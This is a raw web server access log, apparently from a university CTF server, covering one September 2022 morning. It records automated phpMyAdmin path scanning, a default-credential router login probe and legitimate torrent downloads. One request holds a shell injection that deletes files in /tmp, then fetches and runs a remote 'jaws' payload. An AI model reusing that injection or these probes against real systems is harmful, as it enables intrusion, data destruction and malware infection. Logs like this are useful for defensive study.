90.209.165.142 - - [19/Sep/2022:08:08:51 +0300] "GET /db/dbweb/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
90.209.165.142 - - [19/Sep/2022:08:08:51 +0300] "GET /phpMyAdmin-5.2.0/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
90.209.165.142 - - [19/Sep/2022:08:08:51 +0300] "GET /db/phpMyAdmin-5/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
90.209.165.142 - - [19/Sep/2022:08:08:51 +0300] "GET /phpMyAdmin-4.9.7/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
90.209.165.142 - - [19/Sep/2022:08:08:51 +0300] "GET /db/phpMyAdmin-3/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
90.209.165.142 - - [19/Sep/2022:08:08:51 +0300] "GET /db/phpmyadmin5/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
90.209.165.142 - - [19/Sep/2022:08:08:51 +0300] "GET /phpMyAdmin-5/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
90.209.165.142 - - [19/Sep/2022:08:08:51 +0300] "GET /phpMyAdmin4/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
90.209.165.142 - - [19/Sep/2022:08:08:52 +0300] "GET /sql/sqlweb/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
90.209.165.142 - - [19/Sep/2022:08:08:52 +0300] "GET /phpmyAdmin/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
90.209.165.142 - - [19/Sep/2022:08:08:52 +0300] "GET /db/myadmin/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
90.209.165.142 - - [19/Sep/2022:08:08:52 +0300] "GET /myadmin/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
90.209.165.142 - - [19/Sep/2022:08:08:52 +0300] "GET /db/webadmin/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
90.209.165.142 - - [19/Sep/2022:08:08:52 +0300] "GET /phpmyadmin1/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
90.209.165.142 - - [19/Sep/2022:08:08:52 +0300] "GET /phpmyadmin2021/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
90.209.165.142 - - [19/Sep/2022:08:08:52 +0300] "GET /phpmyadmin2013/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
90.209.165.142 - - [19/Sep/2022:08:08:52 +0300] "GET /wp-content/plugins/portable-phpmyadmin/wp-pma-mod/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
90.209.165.142 - - [19/Sep/2022:08:08:52 +0300] "GET /sql/phpmanager/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
90.209.165.142 - - [19/Sep/2022:08:08:52 +0300] "GET /mysql/pMA/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
90.209.165.142 - - [19/Sep/2022:08:08:52 +0300] "GET /PMA/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
90.209.165.142 - - [19/Sep/2022:08:08:53 +0300] "GET /phpMyAdmin2/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
90.209.165.142 - - [19/Sep/2022:08:08:53 +0300] "GET /admin/sysadmin/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
90.209.165.142 - - [19/Sep/2022:08:08:53 +0300] "GET /phppma/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
90.209.165.142 - - [19/Sep/2022:08:08:53 +0300] "GET /sql/websql/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
90.209.165.142 - - [19/Sep/2022:08:08:53 +0300] "GET /phpmyadmin2022/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
90.209.165.142 - - [19/Sep/2022:08:08:53 +0300] "GET /sql/phpmy-admin/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
90.209.165.142 - - [19/Sep/2022:08:08:53 +0300] "GET /phpmyadmin2017/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
90.209.165.142 - - [19/Sep/2022:08:08:53 +0300] "GET /sql/phpmyadmin3/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
90.209.165.142 - - [19/Sep/2022:08:08:53 +0300] "GET /administrator/phpMyAdmin/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
90.209.165.142 - - [19/Sep/2022:08:08:53 +0300] "GET /mysqlmanager/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
90.209.165.142 - - [19/Sep/2022:08:08:53 +0300] "GET /mysql-admin/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
90.209.165.142 - - [19/Sep/2022:08:08:53 +0300] "GET /sql/sql-admin/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
90.209.165.142 - - [19/Sep/2022:08:08:54 +0300] "GET /mysql/sqlmanager/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
90.209.165.142 - - [19/Sep/2022:08:08:54 +0300] "GET /phpmyadmin_/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
90.209.165.142 - - [19/Sep/2022:08:08:54 +0300] "GET /phpMyAdmin-3/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
90.209.165.142 - - [19/Sep/2022:08:08:54 +0300] "GET /db/phpMyAdmin3/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
90.209.165.142 - - [19/Sep/2022:08:08:54 +0300] "GET /phpMyAdmin-5.1.2/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
90.209.165.142 - - [19/Sep/2022:08:08:54 +0300] "GET /phpmyadmin2016/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
90.209.165.142 - - [19/Sep/2022:08:08:54 +0300] "GET /administrator/admin/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
90.209.165.142 - - [19/Sep/2022:08:08:54 +0300] "GET /sqlmanager/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
90.209.165.142 - - [19/Sep/2022:08:08:54 +0300] "GET /administrator/PMA/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
90.209.165.142 - - [19/Sep/2022:08:08:54 +0300] "GET /phpmy/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
90.209.165.142 - - [19/Sep/2022:08:08:54 +0300] "GET /admin/sqladmin/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
90.209.165.142 - - [19/Sep/2022:08:08:55 +0300] "GET /db/webdb/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
90.209.165.142 - - [19/Sep/2022:08:08:55 +0300] "GET /admin/pma/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
90.209.165.142 - - [19/Sep/2022:08:08:55 +0300] "GET /administrator/phpmyadmin/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
90.209.165.142 - - [19/Sep/2022:08:08:55 +0300] "GET /phpmyadmin2019/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
90.209.165.142 - - [19/Sep/2022:08:08:55 +0300] "GET /db/db-admin/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
90.209.165.142 - - [19/Sep/2022:08:08:55 +0300] "GET /administrator/web/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
90.209.165.142 - - [19/Sep/2022:08:08:55 +0300] "GET /phpMyAdmin3/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
90.209.165.142 - - [19/Sep/2022:08:08:55 +0300] "GET /sql/myadmin/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
90.209.165.142 - - [19/Sep/2022:08:08:55 +0300] "GET /phpMyAdmin5/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
90.209.165.142 - - [19/Sep/2022:08:08:55 +0300] "GET /admin/phpmyadmin/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
90.209.165.142 - - [19/Sep/2022:08:08:55 +0300] "GET /sql/phpMyAdmin2/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
90.209.165.142 - - [19/Sep/2022:08:08:55 +0300] "GET /phpmyadmin3/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
90.209.165.142 - - [19/Sep/2022:08:08:56 +0300] "GET /shopdb/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
61.81.88.83 - - [19/Sep/2022:08:18:24 +0300] "GET /shell?cd+/tmp;rm+-rf+*;wget+ rischyo.cf/jaws;sh+/tmp/jaws HTTP/1.1" 404 153 "-" "Hello, world"
87.236.176.166 - - [19/Sep/2022:08:25:43 +0300] "GET / HTTP/1.1" 200 1286 "-" "Mozilla/5.0 (compatible; InternetMeasurement/1.0; +https://internet-measurement.com/)"
87.236.176.61 - - [19/Sep/2022:08:25:50 +0300] "GET /favicon.ico HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
185.220.103.113 - - [19/Sep/2022:08:25:51 +0300] "GET /favicon.ico HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
192.241.219.148 - - [19/Sep/2022:09:16:26 +0300] "GET / HTTP/1.1" 200 1286 "-" "Mozilla/5.0 zgrab/0.x"
94.181.167.195 - - [19/Sep/2022:09:26:21 +0300] "GET /ISO/list.html HTTP/1.1" 200 478 "http://away.vk.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
94.181.167.195 - - [19/Sep/2022:09:26:21 +0300] "GET /favicon.ico HTTP/1.1" 404 188 "http://ctf.pnzgu.ru/ISO/list.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
154.89.5.120 - - [19/Sep/2022:09:29:05 +0300] "GET / HTTP/1.0" 200 3320 "-" "-"
46.44.11.20 - - [19/Sep/2022:09:34:31 +0300] "GET / HTTP/1.1" 200 1286 "-" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
94.181.167.195 - - [19/Sep/2022:09:39:32 +0300] "GET /ISO/Win8.1_Russian_x64.iso HTTP/1.1" 200 4315099136 "http://ctf.pnzgu.ru/ISO/list.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
172.104.138.223 - - [19/Sep/2022:09:40:32 +0300] "GET /fuN3 HTTP/1.0" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36"
87.250.224.192 - - [19/Sep/2022:09:44:07 +0300] "GET /robots.txt HTTP/1.1" 200 26 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
121.62.167.157 - - [19/Sep/2022:10:08:55 +0300] "GET /boaform/admin/formLogin?username=admin&psd=admin HTTP/1.0" 404 153 "-" "-"
192.241.219.148 - - [19/Sep/2022:11:00:07 +0300] "GET /ReportServer HTTP/1.1" 404 125 "-" "Mozilla/5.0 zgrab/0.x"
95.108.213.44 - - [19/Sep/2022:11:02:41 +0300] "GET /robots.txt HTTP/1.1" 200 26 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
172.16.41.88 - - [19/Sep/2022:11:10:00 +0300] "GET /torrents HTTP/1.1" 301 169 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
172.16.41.88 - - [19/Sep/2022:11:10:00 +0300] "GET /torrents/ HTTP/1.1" 200 734 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
172.16.41.88 - - [19/Sep/2022:11:10:00 +0300] "GET /favicon.ico HTTP/1.1" 404 125 "http://ctf.pnzgu.ru/torrents/" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
172.16.41.88 - - [19/Sep/2022:11:10:59 +0300] "GET /torrents/files/bos02-WinXP.ova.torrent HTTP/1.1" 200 93675 "http://ctf.pnzgu.ru/torrents/" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
172.16.41.88 - - [19/Sep/2022:11:12:08 +0300] "GET /torrents/files/bos02-WinXP.ova.torrent HTTP/1.1" 200 93675 "http://ctf.pnzgu.ru/torrents/" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
172.16.41.88 - - [19/Sep/2022:11:12:22 +0300] "GET /torrents/files/bos02-WinXP.ova.torrent HTTP/1.1" 200 93675 "http://ctf.pnzgu.ru/torrents/" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
172.16.41.88 - - [19/Sep/2022:11:23:12 +0300] "GET /torrents/files/bos-01.torrent HTTP/1.1" 200 122885 "http://ctf.pnzgu.ru/torrents/" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
172.16.41.88 - - [19/Sep/2022:11:23:32 +0300] "GET /torrents/files/bos-01.torrent HTTP/1.1" 200 122885 "http://ctf.pnzgu.ru/torrents/" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
172.16.41.88 - - [19/Sep/2022:11:24:20 +0300] "GET /torrents/files/bos02-WinXP.ova.torrent HTTP/1.1" 200 93675 "http://ctf.pnzgu.ru/torrents/" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
172.16.41.88 - - [19/Sep/2022:11:24:44 +0300] "GET /torrents/files/bos03-Debian.ova.torrent HTTP/1.1" 200 117057 "http://ctf.pnzgu.ru/torrents/" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
172.16.41.88 - - [19/Sep/2022:11:24:59 +0300] "GET /torrents/files/bos-04.torrent HTTP/1.1" 200 1216657 "http://ctf.pnzgu.ru/torrents/" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
172.16.41.88 - - [19/Sep/2022:11:25:55 +0300] "GET /torrents/files/bos05-WinXP.ova.torrent HTTP/1.1" 200 177549 "http://ctf.pnzgu.ru/torrents/" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
172.16.41.88 - - [19/Sep/2022:11:26:05 +0300] "GET /torrents/files/bos06-Debian.ova.torrent HTTP/1.1" 200 207610 "http://ctf.pnzgu.ru/torrents/" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
172.16.41.88 - - [19/Sep/2022:11:26:09 +0300] "GET /torrents/files/bos-07-08.torrent HTTP/1.1" 200 278862 "http://ctf.pnzgu.ru/torrents/" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
172.16.41.88 - - [19/Sep/2022:11:30:33 +0300] "GET /favicon.ico HTTP/1.1" 404 125 "http://ctf.ibst.psu/favicon.ico" "Mozilla/5.0 (X11; Linux i686; rv:38.0) Gecko/20100101 Firefox/38.0"
172.16.41.88 - - [19/Sep/2022:11:30:33 +0300] "GET /favicon.png HTTP/1.1" 404 125 "http://ctf.ibst.psu/favicon.png" "Mozilla/5.0 (X11; Linux i686; rv:38.0) Gecko/20100101 Firefox/38.0"
157.90.177.215 - - [19/Sep/2022:11:37:36 +0300] "GET /robots.txt HTTP/1.1" 200 26 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
172.16.41.98 - - [19/Sep/2022:11:53:32 +0300] "GET /torrents HTTP/1.1" 301 169 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
172.16.41.98 - - [19/Sep/2022:11:53:32 +0300] "GET /torrents/ HTTP/1.1" 200 734 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
172.16.41.98 - - [19/Sep/2022:11:53:32 +0300] "GET /favicon.ico HTTP/1.1" 404 125 "http://ctf.pnzgu.ru/torrents/" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
172.16.41.98 - - [19/Sep/2022:11:53:34 +0300] "GET /torrents/files/bos-01.torrent HTTP/1.1" 200 122885 "http://ctf.pnzgu.ru/torrents/" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
172.16.41.98 - - [19/Sep/2022:11:53:38 +0300] "GET /torrents/files/bos05-WinXP.ova.torrent HTTP/1.1" 200 177549 "http://ctf.pnzgu.ru/torrents/" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
172.16.41.98 - - [19/Sep/2022:11:53:41 +0300] "GET /torrents/files/bos03-Debian.ova.torrent HTTP/1.1" 200 117057 "http://ctf.pnzgu.ru/torrents/" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
172.16.41.98 - - [19/Sep/2022:11:53:44 +0300] "GET /torrents/files/bos02-WinXP.ova.torrent HTTP/1.1" 200 93675 "http://ctf.pnzgu.ru/torrents/" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
172.16.41.98 - - [19/Sep/2022:11:53:47 +0300] "GET /torrents/files/bos-04.torrent HTTP/1.1" 200 1216657 "http://ctf.pnzgu.ru/torrents/" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
172.16.41.98 - - [19/Sep/2022:11:53:50 +0300] "GET /torrents/files/bos06-Debian.ova.torrent HTTP/1.1" 200 207610 "http://ctf.pnzgu.ru/torrents/" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
172.16.41.98 - - [19/Sep/2022:11:55:44 +0300] "GET /torrents/files/bos-07-08.torrent HTTP/1.1" 200 278862 "http://ctf.pnzgu.ru/torrents/" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
172.16.41.81 - - [19/Sep/2022:11:58:16 +0300] "GET /torrents HTTP/1.1" 301 169 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
172.16.41.81 - - [19/Sep/2022:11:58:16 +0300] "GET /torrents/ HTTP/1.1" 200 734 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
172.16.41.81 - - [19/Sep/2022:11:58:16 +0300] "GET /favicon.ico HTTP/1.1" 404 125 "http://ctf.pnzgu.ru/torrents/" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
172.16.41.81 - - [19/Sep/2022:11:58:18 +0300] "GET /torrents/files/bos05-WinXP.ova.torrent HTTP/1.1" 200 177549 "http://ctf.pnzgu.ru/torrents/" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
172.16.41.81 - - [19/Sep/2022:11:58:21 +0300] "GET /torrents/files/bos-01.torrent HTTP/1.1" 200 122885 "http://ctf.pnzgu.ru/torrents/" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
172.16.41.81 - - [19/Sep/2022:11:58:24 +0300] "GET /torrents/files/bos03-Debian.ova.torrent HTTP/1.1" 200 117057 "http://ctf.pnzgu.ru/torrents/" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
